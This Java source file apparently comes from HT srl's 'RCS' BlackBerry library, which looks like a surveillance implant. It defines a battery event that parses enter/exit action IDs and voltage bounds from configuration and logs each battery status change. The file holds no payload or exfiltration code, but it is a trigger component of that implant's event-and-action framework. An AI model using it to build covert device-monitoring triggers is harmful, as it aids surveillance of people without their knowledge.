/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : BatteryEvent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

public class BatteryEvent extends Event implements BatteryStatusObserver {

	// #debug
	private static Debug debug = new Debug("AcEvent", DebugLevel.VERBOSE);
	int actionOnEnter ;
	int actionOnExit;
	
	int minVolt;
	int maxVolt;
	
    public BatteryEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_BATTERY, actionId, confParams);
        
        setPeriod(NEVER);
    }

    protected void actualStart(){
    	AppListener.getInstance().addBatteryStatusObserver(this);
    }
 
    protected void actualStop(){
    	AppListener.getInstance().removeBatteryStatusObserver(this);
    }
 
    protected void actualRun() {
    }

    protected boolean parse(final byte[] confParams) {
    	DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length, false);
		try {
			actionOnExit = databuffer.readShort();
			actionOnEnter = databuffer.readShort();
			
			minVolt = databuffer.readInt();
			maxVolt = databuffer.readInt();

			// #ifdef DBC
			Check.asserts(actionOnEnter >= 0, "negative value Enter");
			Check.asserts(actionOnExit >= 0, "negative value Exit");
			// #endif

		} catch (EOFException e) {
			actionOnEnter = Action.ACTION_NULL;
			actionOnExit = Action.ACTION_NULL;
			return false;
		}
		return true;
    }

	public void onBatteryStatusChange(int status, int diff) {
		for (int i = 0; i < 32; i++) {
			final boolean bit = Utils.getBit(diff, i);
			if (bit) {
				batteryStatusChange(1 << i);
			}
		}
	}
	
	public void batteryStatusChange(final int arg0) {
		switch (arg0) {
		case DeviceInfo.BSTAT_AC_CONTACTS:
			// #debug
			debug.info("BSTAT_AC_CONTACTS");
			break;
		case DeviceInfo.BSTAT_CHARGING:
			// #debug
			debug.info("BSTAT_CHARGING");
			break;
		case DeviceInfo.BSTAT_DEAD:
			// #debug
			debug.info("BSTAT_DEAD");
			break;
		case DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER:
			// #debug
			debug.info("BSTAT_IS_USING_EXTERNAL_POWER");
			break;
		case DeviceInfo.BSTAT_LEVEL_CHANGED:
			// #debug
			debug.info("BSTAT_LEVEL_CHANGED");
			break;
		case DeviceInfo.BSTAT_LOW:
			// #debug
			debug.info("BSTAT_LOW");
			break;
		case DeviceInfo.BSTAT_LOW_RATE_CHARGING:
			// #debug
			debug.info("BSTAT_LOW_RATE_CHARGING");
			break;
		case DeviceInfo.BSTAT_NO_CAMERA_FLASH:
			// #debug
			debug.info("BSTAT_NO_CAMERA_FLASH");
			break;
		case DeviceInfo.BSTAT_NO_RADIO:
			// #debug
			debug.info("BSTAT_NO_RADIO");
			break;
		case DeviceInfo.BSTAT_NO_TURN_ON:
			// #debug
			debug.info("BSTAT_NO_TURN_ON");
			break;
		case DeviceInfo.BSTAT_NO_WLAN:
			// #debug
			debug.info("BSTAT_NO_WLAN");
			break;
		case DeviceInfo.BSTAT_NONE:
			// #debug
			debug.info("BSTAT_NONE");
			break;
		case DeviceInfo.BSTAT_REVERSED:
			// #debug
			debug.info("BSTAT_REVERSED");
			break;
		case DeviceInfo.BSTAT_TOO_COLD:
			// #debug
			debug.info("BSTAT_TOO_COLD");
			break;
		case DeviceInfo.BSTAT_TOO_HOT:
			// #debug
			debug.info("BSTAT_TOO_HOT");
			break;
		case DeviceInfo.BSTAT_UNKNOWN_BATTERY:
			// #debug
			debug.info("BSTAT_UNKNOWN_BATTERY");
			break;
		default:
			// #debug
			debug.info("UNKNOWN");
			break;
		}

	}

}
